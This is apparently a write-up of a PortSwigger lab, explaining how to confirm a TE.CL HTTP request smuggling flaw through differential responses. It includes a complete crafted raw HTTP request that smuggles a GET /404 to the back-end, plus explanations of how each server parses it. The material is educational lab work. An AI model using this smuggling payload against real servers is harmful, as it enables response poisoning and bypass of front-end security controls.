# HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses), you'll learn: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-5/images/Pasted%20image%2020230128190147.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-5/images/Pasted%20image%2020230128190204.png)

We can send this request to Burp Suite's Repeater:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-5/images/Pasted%20image%2020230128190221.png)

Then change the request method to POST:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-5/images/Pasted%20image%2020230128190345.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-5/images/Pasted%20image%2020230128190351.png)

Now, we can try to test the web application is vulnerable to TE.CL HTTP request smuggling (Front-end uses `Transfer-Encoding` header, back-end uses `Content-Length` header).

**To do send, we first send an attack request:**
```http
POST / HTTP/1.1
Host: 0aa8008603dfb20dc1821ccb00080051.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

a7
GET /404 HTTP/1.1
Host: 0aa8008603dfb20dc1821ccb00080051.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0


```

> Note: You need to include the trailing sequence `\r\n\r\n` following the final `0`, and go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

This attack request will:

- The front-end server uses `Transfer-Encoding` header, which means it'll see hex chunk `a7` (Decimal 167)
- The back-end server uses `Content-Length` header, which means it'll just see `a7\r\n`. That being said, the back-end server will see:

```http
GET /404 HTTP/1.1
Host: 0aa8008603dfb20dc1821ccb00080051.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-5/images/Pasted%20image%2020230128191347.png)

**After that, we can send a normal GET request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-5/images/Pasted%20image%2020230128191436.png)

**Smuggled normal GET request:**
```http
GET /404 HTTP/1.1
Host: 0aa8008603dfb20dc1821ccb00080051.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0

GET / HTTP/1.1
[...]
```

Nice! We successfully smuggled an attack 404 GET request, and can confirm the web application is vulnerable to TE.CL HTTP request smuggling.

# What we've learned:

1. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses